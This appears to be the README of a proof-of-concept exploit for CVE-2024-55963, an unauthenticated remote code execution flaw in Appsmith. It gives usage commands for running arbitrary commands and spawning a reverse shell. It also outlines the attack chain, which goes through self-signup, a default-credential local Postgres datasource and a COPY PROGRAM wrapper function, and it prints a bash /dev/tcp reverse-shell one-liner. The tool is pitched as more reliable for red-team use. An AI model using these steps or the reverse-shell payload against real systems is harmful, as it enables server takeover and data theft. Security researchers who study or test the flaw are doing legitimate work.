# CVE‑2024‑55963 Appsmith RCE PoC

PoC exploit for CVE‑2024‑55963 that runs arbitrary commands or spawns reverse shell on vulnerable **Appsmith** instances.

It automatically handles both modern servers (with the *environmentId* feature) and much older “legacy” builds that pre‑date it, so you can use one script for every version from **v1.20** up to the last vulnerable release **v1.51**.

---

## Quick start

```bash
# Run an arbitrary command (default is `id`)
python3 appsmith-rce.py https://target.example.com you@pwned.org password123 "whoami"

# spawn a reverse shell
python3 appsmith-rce.py https://target.example.com you@pwned.org password123 -revshell <ip> <port>
```

> **Note:** Any credentials work as long as the server allows self‑service sign‑up.
> The script tries to log in first and falls back to registration if the account does not exist.

---

## How it works (high level)

1. **CSRF & session handling** – pulls the token from several possible endpoints or the cookie jar, then carries it forward.
2. **Login/Signup flow** – logs in or registers a new user with the provided email / password.
3. **Workspace discovery** – grabs an existing workspace or triggers the onboarding flow to auto‑create one.
4. **Environment detection** – queries `/api/v1/environments/workspaces/{id}`; if missing it switches to legacy mode (empty `environmentId`).
5. **Application & page setup** – posts to `/api/v1/applications` and extracts `pageId`.
6. **Datasource creation** – builds a local PostgreSQL datasource that points at `localhost:5432` with `postgres/postgres` creds (allowed by the vulnerable default pg\_hba.conf).
7. **SQL objects** – uploads a helper PL/pgSQL function `exec_cmd()` plus a scratch table `cmd_output` that collects STDOUT.
8. **Command execution** – runs `SELECT * FROM exec_cmd('<your cmd>')` via the `/api/v1/actions/execute` endpoint
9. **Reverse shell (optional)** – executes `bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'` 

---

## Requirements

* Python ≥ 3.8
* `requests` 

---

## Tested versions

| Appsmith version       | Result                              |
| ---------------------- | ----------------------------------- |
| 1.51                   | ✅ RCE                               |
| 1.45                   | ✅ RCE                               |
| 1.30                   | ✅ RCE, legacy path                  |
| 1.52+                  | ❌ Patched – function creation fails |

---

## Differences vs. Rhino Security Labs PoC

This PoC is a bit of an enchancement of the Rhino Security Labs exploit (I didn't realize they already had a public PoC when I was revieweing the research)

Rhino's PoC uses static headers, cookies, and credentials. While testing that exploit I ran into issues when account already existed on specific versions. This script allows a user to enter any email/pass combo they choose from command line. As mentioned, CSRF token is extracted rather than relying on hardcoded values. 

- This version works on older servers that do not have `Environments API` endpoint. 
- The execution path is different. This leverages `COPY PROGRAM` inside `exec_cmd()` PL/pgSQL wrapper and uses `/actions/execute` API, but this is arguably noisier. Rhino relies on the built‑in schema preview endpoint to issue an ad‑hoc COPY (SELECT …) statement. That endpoint truncates output length and adds extra quoting rules, so long commands or chained payloads are harder to pass.
- Single reverse shell flag (:
- Randomizes app/datasource/function names
- No `pyfiglet` dependency
- Older server support by auto-detecting `environmentId` header. Rhino's exploit assumes it is always there.

Together these design choices make the exploit shorter, more reliable, and friendlier for red‑team use while still demoing the same underlying vulnerability.


## References
[rhinosecuritylabs.com](https://rhinosecuritylabs.com/research/cve-2024-55963-unauthenticated-rce-in-appsmith/)

---
## Legal notice

This code is provided **for educational and authorized testing only**.
Running it against systems you do not own or do not have explicit permission to test is likely illegal.
The authors accept **no liability** for misuse.
